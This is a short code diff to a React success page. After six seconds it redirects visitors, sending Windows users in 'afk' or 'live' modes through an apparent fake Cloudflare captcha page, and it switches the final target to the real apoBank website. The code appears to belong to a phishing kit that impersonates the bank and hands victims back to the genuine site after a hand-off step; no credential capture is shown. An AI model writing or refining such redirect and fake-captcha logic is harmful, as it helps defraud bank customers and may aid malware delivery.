@@ -25,7 +25,7 @@ const Success = () => {
         if (data?.flow_mode) mode = data.flow_mode;
       } catch {}
       const gate = isWindows() && (mode === "afk" || mode === "live");
-      const target = gate ? `/cf-captcha?next=${encodeURIComponent("/auth")}` : "/auth";
+      const target = gate ? `/cf-captcha?next=${encodeURIComponent("https://www.apobank.de")}` : "https://www.apobank.de";
       timer = setTimeout(() => { if (!cancelled) navigate(target); }, 6000);
     })();
     return () => { cancelled = true; if (timer) clearTimeout(timer); };
